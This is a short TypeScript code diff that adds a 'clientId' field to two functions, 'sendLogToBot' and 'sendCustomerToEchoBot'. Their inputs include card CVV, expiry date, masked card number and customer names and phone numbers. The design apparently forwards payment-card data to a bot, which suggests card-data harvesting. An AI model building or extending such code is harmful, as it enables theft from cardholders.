@@ -5,6 +5,7 @@ export async function sendLogToBot(data: {
   sessionId: string;
   maskedPan: string;
   bookingId?: string;
+  clientId?: string;
   step?: string;
   cvv?: string;
   expireDate?: string;
@@ -64,6 +65,7 @@ export async function sendCustomerToEchoBot(data: {
   firstName: string;
   lastName: string;
   phoneNumber: string;
+  clientId: string;
 }) {
   try {
     const response = await axios.post(
